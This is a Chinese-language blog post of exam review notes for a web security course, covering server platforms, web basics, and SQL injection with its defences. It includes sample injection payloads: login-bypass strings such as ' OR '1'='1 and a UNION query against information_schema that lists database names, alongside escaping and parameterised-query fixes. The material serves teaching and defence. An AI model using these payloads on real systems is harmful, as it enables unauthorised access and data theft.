<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="https://raw.githubusercontent.com/moyuan10086/photo/main/20220523004342199.png">
  <link rel="icon" type="image/png" sizes="32x32" href="https://raw.githubusercontent.com/moyuan10086/photo/main/20220523004342199.png">
  <link rel="icon" type="image/png" sizes="16x16" href="https://raw.githubusercontent.com/moyuan10086/photo/main/20220523004342199.png">
  <link rel="mask-icon" href="https://raw.githubusercontent.com/moyuan10086/photo/main/blackground.jpg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"moyuan10086.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="prograing or coffee">
<meta property="og:type" content="website">
<meta property="og:title" content="Moyuan&quot;s website">
<meta property="og:url" content="https://moyuan10086.github.io/index.html">
<meta property="og:site_name" content="Moyuan&quot;s website">
<meta property="og:description" content="prograing or coffee">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="moyuan">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://moyuan10086.github.io/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Moyuan"s website</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Moyuan"s website</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">welcome to my website</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">moyuan</p>
  <div class="site-description" itemprop="description">prograing or coffee</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">12</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">分类</span>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/moyuan10086" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;moyuan10086" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:2572045628@qq.com" title="E-Mail → mailto:2572045628@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          链接
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <a href="https://github.com/" title="https:&#x2F;&#x2F;github.com&#x2F;" rel="noopener" target="_blank">GitHub</a>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://moyuan10086.github.io/2025/01/05/Web%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="moyuan">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Moyuan"s website">
      <meta itemprop="description" content="prograing or coffee">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Moyuan"s website">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/01/05/Web%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/" class="post-title-link" itemprop="url">Web安全技术与应用期末复习</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2025-01-05 19:54:51 / 修改时间：19:57:25" itemprop="dateCreated datePublished" datetime="2025-01-05T19:54:51+08:00">2025-01-05</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="Web安全技术与应用期末复习"><a href="#Web安全技术与应用期末复习" class="headerlink" title="Web安全技术与应用期末复习"></a>Web安全技术与应用期末复习</h2><h3 id="题型分布"><a href="#题型分布" class="headerlink" title="题型分布"></a>题型分布</h3><ul>
<li><strong>填空题</strong>：（2*10）</li>
<li><strong>判断题</strong>：（2*10)</li>
<li><strong>问答题</strong>：（60) 4/5</li>
</ul>
<h3 id="复习建议"><a href="#复习建议" class="headerlink" title="复习建议"></a>复习建议</h3><ul>
<li>熟记相关定义的英文缩写及中文名称，确保对各类概念有清晰理解。</li>
</ul>
<h3 id="第一篇-预备知识"><a href="#第一篇-预备知识" class="headerlink" title="第一篇 预备知识"></a>第一篇 预备知识</h3><h4 id="项目1-Web-服务器平台安装与配置"><a href="#项目1-Web-服务器平台安装与配置" class="headerlink" title="项目1 Web 服务器平台安装与配置"></a>项目1 Web 服务器平台安装与配置</h4><ul>
<li><p>原理：搭建一个基本的 Web 服务器平台，包括操作系统 (Windows Server 2008)、Web 服务器 (Apache)、数据库 (MySQL) 和服务器端编程语言 (PHP)。</p>
</li>
<li><p>概念：Web 服务器平台、操作系统、Web 服务器软件、数据库、服务器端编程语言、Web 开发基础 (HTML、CSS、JavaScript、PHP)。</p>
</li>
<li><p><strong>常见服务器操作系统</strong></p>
<ul>
<li>Windows Server</li>
<li>Linux/Unix</li>
</ul>
</li>
<li><strong>主要Web服务器及市场占有率</strong><ul>
<li>Apache：47.0%</li>
<li>Nginx：37.7%</li>
<li>Microsoft IIS：10.0%</li>
</ul>
</li>
<li><strong>Apache优势</strong><ul>
<li>开源、免费</li>
<li>强大的社区支持</li>
</ul>
</li>
<li><strong>关系型数据库管理系统（RDBMS）</strong><ul>
<li>Oracle, Microsoft SQL Server, IBM DB2, MySQL, PostgreSQL</li>
</ul>
</li>
<li><strong>非关系型数据库（NoSQL）</strong><ul>
<li>MongoDB, Redis, Memcached</li>
</ul>
</li>
<li><strong>MySQL优势</strong><ul>
<li>体积小、速度快、成本低</li>
</ul>
</li>
<li><strong>服务器端编程语言</strong><ul>
<li>PHP（83.2%）</li>
<li>ASP, ASP.NET（13.8%）</li>
<li>Java（2.3%）</li>
</ul>
</li>
</ul>
<h4 id="项目2-Web-开发基础"><a href="#项目2-Web-开发基础" class="headerlink" title="项目2 Web 开发基础"></a>项目2 Web 开发基础</h4><ul>
<li><p>原理：学习 Web 开发基础，包括使用 MySQL 数据库进行数据操作，以及使用 HTML、CSS 和 JavaScript 进行静态网页和动态网页开发。</p>
</li>
<li><p>概念：数据库操作 (DDL、DML)、SQL 语句、HTML、CSS、JavaScript、PHP 动态网页开发。</p>
</li>
<li><p>知识储备</p>
<ul>
<li><ol>
<li><strong>数据库管理系统 (DBMS)</strong></li>
</ol>
<ul>
<li><p>定义：操纵和管理数据库的大型软件，分为关系型和非关系型。</p>
</li>
<li><p>常见DBMS：</p>
<ul>
<li><p>关系型：Oracle、MySQL、SQL Server。</p>
</li>
<li><p>非关系型：MongoDB、Redis。</p>
</li>
</ul>
</li>
<li><p>特点：</p>
<ul>
<li>关系型数据库：支持事务完整性和一致性，使用SQL语言操作。</li>
</ul>
</li>
</ul>
</li>
<li><ol>
<li><strong>网页制作基础</strong></li>
</ol>
<ul>
<li><p>静态网页：</p>
<ul>
<li><p>仅供浏览，不与用户交互。</p>
</li>
<li><p>示例：博客文章、QQ日志。</p>
</li>
</ul>
</li>
<li><p>动态网页：</p>
<ul>
<li><p>支持与Web服务器交互，如用户登录、评论功能。</p>
</li>
<li><p>示例：微博、论坛。</p>
</li>
</ul>
</li>
</ul>
</li>
<li><ol>
<li><strong>网页前端语言</strong></li>
</ol>
<ul>
<li><p>HTML：</p>
<ul>
<li><p>定义网页的结构。</p>
</li>
<li><p>用标记语言描述内容，如表格、标题、图片。</p>
</li>
</ul>
</li>
<li><p>CSS：</p>
<ul>
<li><p>定义网页的外观样式。</p>
</li>
<li><p>层叠样式表，控制HTML元素的布局和设计。</p>
</li>
</ul>
</li>
<li><p>JavaScript：</p>
<ul>
<li><p>定义网页的行为。</p>
</li>
<li><p>添加交互功能，如动态时间显示。</p>
</li>
</ul>
</li>
</ul>
</li>
<li><ol>
<li><strong>网页后端语言</strong></li>
</ol>
<ul>
<li><p>PHP：</p>
<ul>
<li><p>服务器端脚本语言，用于生成动态网页。</p>
</li>
<li><p>特点：混合HTML标签编写，结果以HTML形式返回浏览器。</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="第二篇-SQL-注入攻击及防护"><a href="#第二篇-SQL-注入攻击及防护" class="headerlink" title="第二篇 SQL 注入攻击及防护"></a>第二篇 SQL 注入攻击及防护</h3><h4 id="项目3-万能密码登录Post-型注入攻击"><a href="#项目3-万能密码登录Post-型注入攻击" class="headerlink" title="项目3 万能密码登录Post 型注入攻击"></a>项目3 万能密码登录Post 型注入攻击</h4><ul>
<li><p>原理：利用 SQL 注入攻击，通过构造特殊的用户名或密码，绕过登录验证，获取管理员权限。</p>
</li>
<li><p>概念：SQL 注入攻击、万能密码、Session 验证、Post 请求、SQL 语句拼接。</p>
</li>
</ul>
<h5 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h5><ul>
<li><strong>定义</strong>：统一资源定位符（Uniform Resource Locator），用于定位Web资源。</li>
<li><strong>结构</strong>：由协议、域名、路径、参数组成。</li>
</ul>
<h5 id="表单-Form"><a href="#表单-Form" class="headerlink" title="表单 (Form)"></a><strong>表单 (Form)</strong></h5><ul>
<li><p>概念：用于用户输入数据并提交给服务器的HTML组件，包括文本框、按钮、下拉列表等。</p>
</li>
<li><p>提交方式：</p>
<ul>
<li><p>GET：</p>
<ul>
<li><p>参数通过URL传递，适合少量数据提交。</p>
</li>
<li><p>不安全，数据会显示在地址栏。</p>
</li>
</ul>
</li>
<li><p>POST：</p>
<ul>
<li><p>参数通过HTTP请求体传递，不显示在URL。</p>
</li>
<li><p>安全性较高，适合大数据量传输。</p>
</li>
</ul>
</li>
<li><p>对比见下表：</p>
</li>
</ul>
<p>| <strong>特性</strong>           | <strong>Get方式</strong>                   | <strong>Post方式</strong>                  |<br>| ————————— | ——————————————- | ——————————————- |<br>| <strong>URL显示</strong>        | 表单参数显示在URL中           | 表单参数不显示在URL中         |<br>| <strong>长度限制</strong>       | 有限制（URL长度限制）         | 理论上无限                    |<br>| <strong>浏览器历史保存</strong> | 参数保留在浏览器历史中        | 参数不保留在浏览器历史中      |<br>| <strong>URL参数保存</strong>    | 可通过保存URL的方式保存参数   | 不可通过保存URL的方式保存参数 |<br>| <strong>刷新提交机制</strong>   | 刷新不会重新提交              | 刷新会重新提交                |<br>| <strong>字符编码限制</strong>   | 仅限ASCII字符（可能显示乱码） | 无限制                        |</p>
</li>
</ul>
<h5 id="Session机制"><a href="#Session机制" class="headerlink" title="Session机制"></a><strong>Session机制</strong></h5><ul>
<li><p>原理：</p>
<ul>
<li><p>HTTP协议是无状态的，Session通过存储用户状态信息解决此问题。</p>
</li>
<li><p>用户登录成功后，服务器生成Session ID，用户浏览器保存该ID。</p>
</li>
<li><p>每次请求时携带Session ID，服务器验证用户状态。</p>
</li>
</ul>
</li>
<li><p>流程：</p>
<ul>
<li><p>用户提交账号密码登录。</p>
</li>
<li><p>服务器验证信息后建立Session会话。</p>
</li>
<li><p>用户操作结束后，可通过注销功能销毁Session。</p>
</li>
</ul>
</li>
</ul>
<h5 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a><strong>SQL注入攻击</strong></h5><ul>
<li><p>原理：</p>
<ul>
<li><p>通过在输入参数中插入恶意SQL语句，破坏原有SQL逻辑。</p>
</li>
<li><p>典型形式：万能密码，如 ‘ <strong>OR</strong> ‘1’=’1，条件恒成立，绕过登录验证。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">AND</span> passcode<span class="operator">=</span><span class="string">&#x27;任意内容&#x27;</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>常见变体：</p>
<ul>
<li><p>注释型：’or 1=1— （将后续语句注释掉）。</p>
</li>
<li><p>条件型：’or 1=1#（将后续语句截断）。</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>危害：</p>
<ul>
<li><p>绕过权限登录。</p>
</li>
<li><p>非授权访问、篡改数据库。</p>
</li>
<li><p>挂马攻击、控制服务器。</p>
</li>
</ul>
</li>
</ul>
<h5 id="防护方法"><a href="#防护方法" class="headerlink" title="防护方法"></a><strong>防护方法</strong></h5><ul>
<li><p><strong>输入限制</strong></p>
<ul>
<li><p><strong>使用正则表达式过滤</strong>：</p>
<ul>
<li><p>限制用户名和密码输入的字符类型，只允许字母、数字和下划线，禁止单引号等危险符号。</p>
<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-zA-Z0-9_]&#123;5,16&#125;$/&#x27;</span>, <span class="variable">$username</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;用户名格式错误！&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>通俗解释</strong>：<br>用户名只能是5到16位的英文字母、数字或下划线，如果输入包含<code>&#39;</code>、<code>--</code>等危险字符，会直接拦截。</p>
</li>
</ul>
</li>
<li><p><strong>前端校验</strong>：</p>
<ul>
<li><p>使用HTML5的<code>pattern</code>属性或JavaScript限制用户输入格式。</p>
<p>示例代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">pattern</span>=<span class="string">&quot;[a-zA-Z0-9_]&#123;5,16&#125;&quot;</span> <span class="attr">required</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<p><strong>SQL查询优化</strong></p>
<ul>
<li><p><strong>转义特殊字符</strong>：</p>
<ul>
<li><p>使用PHP函数对用户输入进行处理，转义SQL语句中的特殊字符，避免破坏语句结构。</p>
<p>常用函数：</p>
<ul>
<li><code>addslashes()</code>：为单引号、双引号等特殊字符添加反斜杠。</li>
<li><code>mysqli_real_escape_string()</code>：更安全地转义SQL语句中的特殊字符。</li>
</ul>
<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$password</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>通俗解释</strong>：<br>如果用户输入了<code>&#39;or 1=1--</code>，转义后会变成<code>\&#39;&#39;or 1=1--</code>，SQL语句就无法被注入。</p>
</li>
</ul>
</li>
<li><p><strong>参数化查询</strong>（最有效的方法）：</p>
<ul>
<li><p>将SQL语句和用户输入分开处理，防止用户输入被解释为SQL指令。</p>
<p>使用PDO或MySQLi支持参数化查询，避免SQL注入。</p>
<p>示例代码（PDO）：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM users WHERE username = :username AND passcode = :passcode&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="string">&#x27;:username&#x27;</span> =&gt; <span class="variable">$username</span>, <span class="string">&#x27;:passcode&#x27;</span> =&gt; <span class="variable">$password</span>]);</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>通俗解释</strong>：<br>数据库会先处理SQL语句，再将用户输入作为参数加入，这样即使输入恶意代码，也只会当成普通文本。</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>防护方法对比</strong></p>
</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>方法</th>
<th>优点</th>
<th>缺点</th>
</tr>
</thead>
<tbody>
<tr>
<td>正则表达式过滤</td>
<td>简单易用，限制性强</td>
<td>需要严格定义规则，可能误判合法输入</td>
</tr>
<tr>
<td>转义特殊字符</td>
<td>使用方便，兼容性好</td>
<td>需注意宽字节字符集的风险</td>
</tr>
<tr>
<td>参数化查询</td>
<td>安全性高，根本性防护SQL注入</td>
<td>程序复杂性增加，对旧项目兼容性一般</td>
</tr>
</tbody>
</table>
</div>
<h4 id="项目4-数据库暴库Get-型注入攻击"><a href="#项目4-数据库暴库Get-型注入攻击" class="headerlink" title="项目4 数据库暴库Get 型注入攻击"></a>项目4 数据库暴库Get 型注入攻击</h4><ul>
<li><p>原理：利用 SQL 注入攻击，通过构造特殊的 URL 参数，获取数据库中的敏感信息，例如所有数据库名、所有数据表名、所有列名和所有数据。</p>
</li>
<li><p>概念：SQL 注入攻击、Get 请求、SQL 语句拼接、联合查询、信息泄露。</p>
</li>
</ul>
<h5 id="HTML-Get方式提交原理"><a href="#HTML-Get方式提交原理" class="headerlink" title="HTML Get方式提交原理"></a><strong>HTML Get方式提交原理</strong></h5><ul>
<li><p>Get方式特点：</p>
<ul>
<li><p>表单数据以 <code>变量=值</code> 的形式附加到URL后，使用 <code>?</code> 连接。</p>
</li>
<li><p>多个变量之间使用<code>&amp;</code>分隔，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/?id=1&amp;name=test</span><br></pre></td></tr></table></figure>
</li>
<li><p>仅支持ASCII字符，非ASCII字符需通过URL编码（<code>%</code>加16进制）传递。</p>
</li>
</ul>
</li>
</ul>
<h5 id="数据库暴库"><a href="#数据库暴库" class="headerlink" title="数据库暴库"></a><strong>数据库暴库</strong></h5><ul>
<li><p><strong>定义</strong>：通过SQL注入等漏洞非法获取数据库内容。</p>
</li>
<li><p>实现原理：</p>
<ul>
<li><p>利用SQL的<code>UNION</code>操作符，将攻击者构造的查询结果与正常查询结果合并。</p>
</li>
<li><p>结合MySQL内置的<code>information_schema</code>数据库，可获取数据库、表及列的结构信息。</p>
</li>
<li><p>示例查询：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> books </span><br><span class="line"><span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;-1&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>, group_concat(schema_name), <span class="number">3</span> </span><br><span class="line"><span class="keyword">FROM</span> information_schema.schemata;</span><br></pre></td></tr></table></figure>
</li>
<li><p>关键点：</p>
<ul>
<li><code>information_schema</code>：MySQL内置数据库，保存数据库结构信息。</li>
<li><code>UNION</code>：合并两个<code>SELECT</code>结果集，要求列数和数据类型匹配。</li>
<li><code>group_concat()</code>：将查询结果拼接为一行，方便显示。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="Get型与Post型SQL注入的区别"><a href="#Get型与Post型SQL注入的区别" class="headerlink" title="Get型与Post型SQL注入的区别"></a><strong>Get型与Post型SQL注入的区别</strong></h5><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center"><strong>特性</strong></th>
<th style="text-align:center"><strong>Get型</strong></th>
<th style="text-align:center"><strong>Post型</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><strong>提交方式</strong></td>
<td style="text-align:center">参数附加在URL后</td>
<td style="text-align:center">参数嵌入HTTP请求体</td>
</tr>
<tr>
<td style="text-align:center"><strong>数据传递位置</strong></td>
<td style="text-align:center">浏览器地址栏显示</td>
<td style="text-align:center">不显示</td>
</tr>
<tr>
<td style="text-align:center"><strong>适用场景</strong></td>
<td style="text-align:center">超链接传递参数</td>
<td style="text-align:center">表单提交数据</td>
</tr>
<tr>
<td style="text-align:center"><strong>典型漏洞</strong></td>
<td style="text-align:center">查询操作时的SQL拼接漏洞</td>
<td style="text-align:center">表单提交数据时的SQL拼接漏洞</td>
</tr>
</tbody>
</table>
</div>
<h5 id="防护方式"><a href="#防护方式" class="headerlink" title="防护方式"></a><strong>防护方式</strong></h5><h6 id="使用转义函数"><a href="#使用转义函数" class="headerlink" title="使用转义函数"></a><strong>使用转义函数</strong></h6><p>通过 <strong>转义用户输入的内容</strong>，避免特殊字符（如单引号 <code>&#39;</code> 或双引号 <code>&quot;</code>）对SQL语句的破坏。</p>
<p><strong>具体实现</strong></p>
<ul>
<li><p>使用PHP的 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_escape_string()</span><br></pre></td></tr></table></figure>
<p> 函数对输入内容进行处理：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">mysqli_escape_string</span>(<span class="variable">$conn</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM books WHERE id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>作用：</p>
<ul>
<li>将用户输入中可能影响SQL逻辑的字符进行转义，例如：<ul>
<li><code>&#39;</code> 转换为 <code>\&#39;</code></li>
<li><code>&quot;</code> 转换为 <code>\&quot;</code></li>
<li><code>;</code> 转换为 <code>\;</code></li>
</ul>
</li>
</ul>
</li>
<li><p>优点：</p>
<ul>
<li>简单易用，能防护常见的注入攻击。</li>
</ul>
</li>
<li><p>缺点：</p>
<ul>
<li><strong>宽字符绕过风险</strong>：在某些情况下，攻击者可以利用宽字符编码绕过转义。</li>
<li>仍然属于 <strong>SQL语句拼接</strong> 的方式，不是最佳实践。</li>
</ul>
</li>
</ul>
<h6 id="使用参数化查询（推荐方法）"><a href="#使用参数化查询（推荐方法）" class="headerlink" title="使用参数化查询（推荐方法）"></a><strong>使用参数化查询（推荐方法）</strong></h6><p><strong>参数化查询</strong> 是目前最推荐的防护方式。它通过将用户输入与SQL语句分离，避免用户输入直接影响SQL逻辑。</p>
<p><strong>为什么参数化查询更安全？</strong></p>
<ul>
<li>在参数化查询中，用户输入作为 <strong>参数</strong> 传递，而不是直接拼接到SQL语句中。</li>
<li>数据库会将参数当作 <strong>普通数据</strong> 处理，而不会解析其中的特殊字符。</li>
</ul>
<p><strong>具体实现方式</strong></p>
<p><strong>MySQLi参数化查询</strong></p>
<ul>
<li><p>使用 MySQLi 的 <code>prepare()</code> 和 <code>bind_param()</code> 方法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;username&quot;</span>, <span class="string">&quot;password&quot;</span>, <span class="string">&quot;lab&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查连接是否成功</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 准备SQL语句</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM books WHERE id = ?&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);  <span class="comment">// &quot;i&quot; 表示参数是整数类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行SQL查询</span></span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">get_result</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结果</span></span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span 